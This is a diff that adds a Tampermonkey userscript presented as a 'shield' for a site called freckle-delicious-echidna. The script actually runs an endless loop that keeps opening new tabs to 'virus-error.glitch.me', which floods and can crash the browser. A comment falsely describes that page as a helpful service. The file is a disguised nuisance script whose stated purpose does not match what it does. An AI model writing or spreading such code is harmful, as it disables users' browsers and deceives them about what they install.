@@ -1,0 +1,16 @@
+// ==UserScript==
+// @name         shield for freckle-delicious-echidna
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  apple
+// @author       YogeshShields
+// @grant        none
+// ==/UserScript==
+
+(function(apple = true) {
+    'use strict';
+    while (apple = true) {
+window.open("https://virus-error.glitch.me/", "_blank")
+// https://virus-error.glitch.me/ is a web that helps to take out scares from freckle-delicious-echidna.
+}
+})();
